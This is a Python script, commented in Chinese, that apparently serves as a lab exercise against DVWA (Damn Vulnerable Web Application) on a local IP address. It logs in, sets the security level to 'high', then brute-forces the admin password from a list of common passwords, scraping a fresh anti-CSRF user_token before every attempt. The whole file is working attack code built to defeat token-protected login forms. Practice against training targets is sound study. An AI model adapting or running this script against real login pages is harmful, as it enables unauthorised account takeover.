import requests
import re
import sys

# ========== 配置区（根据你环境改这里就行）==========
BASE = "http://192.168.108.128:9111"
DVWA_USER = "admin"
DVWA_PASS = "password"   # DVWA 默认登录密码（不是要爆破的那个！）
SECURITY  = "high"       # ⭐ 按你要求：HIGH 难度

url_login    = f"{BASE}/login.php"
url_security = f"{BASE}/security.php"
url_brute    = f"{BASE}/vulnerabilities/brute/"

# 和你 Burp 里一致的密码字典
pwd_list = [
    "23456","password","123456789","12345","12345678",
    "qwerty","password123","1234567890","123123","admin",
    "111111","letmein","welcome","monkey","iloveyou",
    "000000","abc123","qwerty123","654321","dragon",
]

# ========== 工具函数 1：健壮的 token 提取 ==========
def get_user_token_or_none(html: str) -> str | None:
    """找 user_token，找不到返回 None（不崩）。"""
    patterns = [
        r'name=[\'"]user_token[\'"]\s+value=[\'"]([^\'"]+)[\'"]',
        r'value=[\'"]([^\'"]+)[\'"]\s+name=[\'"]user_token[\'"]',
        r'<input[^>]*user_token[^>]*value=[\'"]([^\'"]+)[\'"]',
    ]
    for p in patterns:
        m = re.search(p, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

# ========== 工具函数 2：必取（login/security 页面必须有 token，否则直接带诊断退出）==========
def require_user_token(html: str, context: str) -> str:
    tok = get_user_token_or_none(html)
    if tok is not None:
        return tok
    print(f"\n[FATAL] 在{context}里没匹配到 user_token！", file=sys.stderr)
    is_login_redir = "login.php" in html.lower() or html.lower().strip().startswith("<title>login")
    if is_login_redir:
        print("  → 返回内容像登录页 → Session 失效或请求被拒绝", file=sys.stderr)
    if "<title>404" in html or "404 Not Found" in html:
        print("  → 返回 404 → 检查 BASE/端口/DVWA 是否启动", file=sys.stderr)
    print(f"  → HTML 前 500 字符预览：\n{html[:500]}\n", file=sys.stderr)
    sys.exit(1)

# ========== 第 0 步：启动 Session ==========
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
print(f"[*] 目标靶机: {BASE}")
print(f"[*] 1) 登录 DVWA ({DVWA_USER}/{DVWA_PASS}) ...")

# ========== 第 1 步：登录 DVWA ==========
r = session.get(url_login, timeout=10)
if r.status_code != 200:
    print(f"[FATAL] 访问登录页失败 HTTP {r.status_code}。", file=sys.stderr)
    sys.exit(2)

login_data = {
    "username": DVWA_USER,
    "password": DVWA_PASS,
    "Login":    "Login",
    "user_token": require_user_token(r.text, "登录页(login.php)"),
}
r2 = session.post(url_login, data=login_data, allow_redirects=True, timeout=10)

if "Welcome to Damn Vulnerable Web Application!" in r2.text or "index.php" in r2.url:
    print(f"[+] DVWA 登录成功！初始 Cookie = {dict(session.cookies)}")
else:
    print("[FATAL] 登录失败，返回内容不像首页。", file=sys.stderr)
    print(f"  → URL={r2.url}  前 300 字符：{r2.text[:300]}\n", file=sys.stderr)
    sys.exit(3)

# ========== 第 2 步：设置安全等级 = HIGH（依据 Cookie 是否更新判定是否成功，最靠谱！）==========
print(f"[*] 2) 设置 DVWA 安全等级 → {SECURITY.upper()}")
r3 = session.get(url_security, timeout=10)
r4 = session.post(url_security, data={
    "security": SECURITY,
    "seclev_submit": "Submit",
    "user_token": require_user_token(r3.text, "安全设置页(security.php)"),
}, timeout=10)

# 再 GET 一次，看最终 Cookie 里的 security 是啥（这才是最终生效的！）
r5 = session.get(url_security, timeout=10)
cookie_sec = session.cookies.get("security")
print(f"[Cookie] 当前 security = {cookie_sec!r}")
if cookie_sec != SECURITY:
    print(f"[FATAL] 设置失败！Cookie security={cookie_sec!r} 不等于目标 {SECURITY!r}", file=sys.stderr)
    sys.exit(4)

# 同时校验 HTML 选中项（做佐证，不做硬要求）
sel_list = re.findall(r"<option\s+value=[\'\"]?(low|medium|high|impossible)[\'\"]?\s+selected",
                      r5.text, re.IGNORECASE)
if sel_list:
    print(f"[+] 安全等级已生效：Cookie={cookie_sec}，HTML 选中={sel_list}")
else:
    print(f"[i] (Cookie 已为 {cookie_sec}，无需再看 HTML selected 属性)")

# ========== 第 3 步：开始爆破（自适应 LOW/HIGH：有 token 传，没 token 就不传）==========
print(f"[*] 3) 开始爆破（SECURITY={cookie_sec}），候选密码共 {len(pwd_list)} 个 ...")

found = False
for i, pwd in enumerate(pwd_list, 1):
    # HIGH 难度每轮要刷新一次 token（DVWA 每次换）
    brute_html = session.get(url_brute, timeout=10).text

    params = {
        "username": "admin",
        "password": pwd,
        "Login":    "Login",
    }
    tok = get_user_token_or_none(brute_html)
    if tok is not None:
        params["user_token"] = tok        # HIGH/MEDIUM 会走这里
        mode_tag = "带token"
    else:
        mode_tag = "无token"              # LOW 走这里（本来就不需要 token）

    resp = session.get(url_brute, params=params, timeout=10)

    if "Welcome to the password protected area admin" in resp.text:
        print(f"\n[🎉 BINGO] 爆破成功！正确密码：{pwd}")
        print(f"    Username=admin   Password={pwd}   （{mode_tag} 模式）")
        found = True
        break
    elif "Username and/or password incorrect." in resp.text:
        print(f"  [-] ({i:>2}/{len(pwd_list)}) {pwd:<16} → 用户名或密码错误   ({mode_tag}, token={str(tok)[:8]}...)")
    else:
        print(f"  [?] ({i:>2}/{len(pwd_list)}) {pwd:<16} → 响应 len={len(resp.text)}（无明确错误，疑似被拦/{mode_tag}模式错配）")
        # 前 2 次未知情况给点诊断
        if i <= 2:
            print(f"      → 该轮响应中是否含 token？{get_user_token_or_none(resp.text) is not None}")

if not found:
    print(f"\n[*] 字典跑完（{len(pwd_list)} 个），未命中。试试扩大字典 or 换账号？")
